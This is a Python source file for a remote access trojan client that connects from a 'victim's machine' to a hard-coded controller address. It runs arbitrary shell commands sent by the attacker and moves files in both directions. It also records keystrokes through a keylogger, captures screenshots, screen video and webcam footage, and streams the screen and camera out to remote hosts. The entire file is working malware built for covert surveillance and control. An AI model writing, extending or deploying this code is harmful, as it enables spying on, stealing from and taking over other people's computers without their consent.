import socket # module help us to create sockets that act as end-point for 2-way communication between 2 processes over a network
import os # module that helps to execute instructions recieved from server,it provides functions for interacting with OS
import subprocess # module that helps to spawn new processes and attach to their input,output and error pipeline
import sys  # helps us to execute terminal commands
import pyautogui
import numpy as np 
import cv2,pickle,struct,imutils
import pyscreenshot as ImageGrab
from pynput.keyboard import Listener,Key 
import platform
from vidstream import ScreenShareClient
import time

count=0 # to store count of keys logged

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine


host="192.168.1.5"
port=9999



s.connect((host,port)) 

# to record screen
def capture_screen():
    SCREEN_SIZE=pyautogui.size()

    fourcc=cv2.VideoWriter_fourcc(*'XVID')  # video codec library to write video file

    out=cv2.VideoWriter("output.avi",fourcc,20.0,SCREEN_SIZE)
    for i in range(200):

        img=pyautogui.screenshot()
        frame=np.array(img)

        frame=cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
        out.write(frame)


    out.release()
    cv2.destroyAllWindows()

# to record webcam feed
def capture_webcam():
    vid=cv2.VideoCapture(0,cv2.CAP_DSHOW)  # to remove warning changing backend to CAP_DSHOW
    fourcc=cv2.VideoWriter_fourcc(*'XVID')  # video codec library to write video file
    width = int(vid.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(vid.get(cv2.CAP_PROP_FRAME_HEIGHT))
    out=cv2.VideoWriter("webcam.avi",fourcc,20.0,(width,height))

    for i in range(120):
        ret,frame=vid.read()
        if ret == True:
            frame=cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
            out.write(frame)
    vid.release()
    out.release()
    cv2.destroyAllWindows()

# keylogger code
def capture_keys():

    def on_press(key):
        global count
        count+=1
        with open("log.txt","a") as f:
            if(key == Key.space):
                key = str(key).replace("Key.space", " ")
            if(key == Key.backspace):
                key = str(key).replace("Key.backspace", " ")
            if(key == Key.enter):
                key = str(key).replace("Key.enter", " ")
            
            key=str(key).replace("Key.","")
            key=key.replace("'","")
            f.write(key)


    def on_release(key):
        global count 
        if key == Key.esc or count > 50:
            count=0
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()




while True:  # An infinite loop to execute multiple commands recieved from server
    try:
        data=s.recv(20480) # recieving data in form of bytes 
        if data[:].decode() == "sysinfo":
            my_system = platform.uname()
 
            output=f"System: {my_system.system}\n"+f"Node Name: {my_system.node}\n"+f"Release: {my_system.release}\n"+f"Version: {my_system.version}\n"+f"Machine: {my_system.machine}\n"+f"Processor: {my_system.processor}\n"
            output+= os.getcwd() + "> "
            s.send(output.encode())
            continue

        if data[:].decode() == "webcam":
            s.send("capturing_webcam".encode())
            s.recv(2048)
            try:
                capture_webcam()
                f=open("webcam.avi","rb")
                data=f.read()
                #print("data is",data)
                l=len(data)
                print("l is ",l)
                s.send(str(l).encode())

                response=s.recv(20480)
                s.send(data)
                fin = s.recv(1024)

                f.close()
                os.remove("webcam.avi")
            except:
                s.send('0'.encode())
                s.recv(1024)

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue            

        if data[:].decode() == "rec":
            s.send("capturing".encode())

            capture_screen()
            f=open("output.avi","rb")
            data=f.read()
            #print("data is",data)
            l=len(data)
            print("l is ",l)
            s.send(str(l).encode())

            response=s.recv(20480)
            s.send(data)
            fin = s.recv(1024)

            f.close()
            os.remove("output.avi")

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue

        if data[:].decode() == "vidstream":
            s.send("streaming".encode())
            time.sleep(5)
            client = ScreenShareClient('192.168.1.12',7878)
            
            client.start_stream()
            continue

        if data[:].decode() == "camstream":
            vid = cv2.VideoCapture(0)
            s.send("camstreaming".encode())
            while(vid.isOpened()):
                img,frame = vid.read()
                frame = imutils.resize(frame,width=320)
                a = pickle.dumps(frame)
                message = struct.pack("Q",len(a))+a
                s.sendall(message)
                
                cv2.imshow('TRANSMITTING VIDEO',frame)
                key = cv2.waitKey(1) & 0xFF
                if key ==ord('q'):
                    break


        if data[:].decode("utf-8").split(" ")[0] == "getfile":
            filepath=data[:].decode("utf-8").split(" ")[1]
            filename=os.path.basename(filepath)
            s.send("sending_file".encode())
            s.recv(2048)
            try:
                f=open(filepath,"rb")
                data=f.read()
                l=len(data)
                s.send(str(l).encode())
                s.recv(1024)
                s.send(data)
                s.recv(1024)
                f.close()

            except:
                s.send("0".encode())
                s.recv(1024)

            output=os.getcwd() + "> "
            s.send(output.encode())
            continue

        if data[:].decode("utf-8").split(" ")[0] == "sendfile":
            filepath=data[:].decode("utf-8").split(" ")[1]
            s.send("receiving_file".encode())
            filename=os.path.basename(filepath)
            l=int(s.recv(20480).decode())

            if l==0:
                pass        

            else:
                f=open(filename,"wb")
                s.send("start".encode())
                curr_len=0
                while curr_len<l:
                    data=s.recv(204800)
                    curr_len+=len(data)
                    f.write(data)
                    s.send(str(curr_len).encode())

                s.recv(1024)
                f.close()

            output=os.getcwd() + "> "
            s.send(output.encode())
            continue


        if data[:].decode() == "ss":
            s.send("clicking".encode())
            im=ImageGrab.grab()
            im.save("screenshot.jpg")
            f=open("screenshot.jpg","rb")
            data=f.read()

            l=len(data)
            s.send(str(l).encode())

            response=s.recv(20480)
            s.send(data)
            fin=s.recv(1024)

            f.close()
            os.remove("screenshot.jpg")

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue

        if data[:].decode() == "keylogger":
            s.send("Logging_keys".encode())
            s.recv(1024)
            capture_keys()
            s.send("done".encode())
            s.recv(1024)
            f=open("log.txt","rb")
            data=f.read()
            l=len(data)
            s.send(str(l).encode())
            s.recv(1024)
            s.send(data)
            s.recv(1024)
            f.close()
            os.remove("log.txt")
            output=os.getcwd()+"> "
            s.send(output.encode())
            continue



        if data[:2].decode("utf-8") == "cd":   
            path=data[3:].decode("utf-8")      
            os.chdir(path)                    
        if len(data) > 0:    # to check whether any data has been entered by attacker or not
            
            cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE,stderr=subprocess.PIPE)   
                                                                      
            output_byte=cmd.stdout.read() + cmd.stderr.read()   
            output_string=str(output_byte,"utf-8") 
            current_dir=os.getcwd() + "> "       
            
            s.send(str.encode(output_string+current_dir))      
            print(output_string+current_dir)           
                 
            cmd.terminate()                     
    except Exception as e:
        print("Connection has been closed by server!!!")
        s.close()
        break
